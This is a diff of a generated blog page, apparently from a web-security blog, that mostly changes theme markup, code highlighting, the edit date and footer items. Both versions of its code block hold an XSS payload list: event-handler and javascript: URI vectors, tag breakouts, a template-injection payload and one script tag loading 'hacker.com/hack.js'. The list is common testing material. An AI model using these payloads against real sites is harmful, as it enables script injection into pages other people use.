@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -388,12 +388,37 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;hacker.com/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>cilck me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunload</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> data:text/html,<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"> */alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>/*</span><br><span class="line"><span class="javascript"> <span class="title">constructor</span>.<span class="title">constructor</span>(<span class="params"><span class="string">&#x27;alert(/xss/)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+  <pre><code class="html">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;Script&gt;alert(1)&lt;/Script&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
+&lt;script src=&quot;hacker.com/hack.js&quot;&gt;&lt;/script&gt;
+&lt;a href=&quot;javascript:alert(1)&quot;&gt;cilck me&lt;/a&gt;
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
+&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;/embed&gt;
+&lt;body onload=&quot;alert(1);&quot;&gt;
+&lt;body onunload=&quot;alert(1);&quot;&gt;
+&quot;&gt;&lt;svg onload=alert(1)&gt;
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+ &lt;/style&gt;&lt;svg onload=alert(1)&gt;
+ data:text/html,&lt;svg onload=alert(1)&gt;
+ &lt;/script&gt;&lt;svg onload=alert(1)&gt;
+ */alert(1)&lt;/script&gt;&lt;script&gt;/*
+ constructor.constructor(&#39;alert(/xss/)&#39;)()&#125;&#125;</code></pre>
+
   
   
     
     <div class='footer'>
       
+      
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2020/05/26/browser-auditor-200526/" title="Browser Auditor 기술 발표 자료" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">Browser Auditor 기술 발표 자료</span></a><a class="item" href="/2020/04/22/xssgame-200422/" title="xss game Write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">xss game Write up</span></a><a class="item" href="/2020/04/22/jwtinjection-200422/" title="JWT None Type Injection" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">JWT None Type Injection</span></a></div></section></div>
       
       
       
@@ -407,10 +432,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-17T18:00:58+09:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-05T00:00:00+09:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditJan 17, 2021</p>
+    <p>EditFeb 5, 2020</p>
   </a>
 </div>
 
@@ -510,42 +535,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -681,6 +670,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1056,6 +1047,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
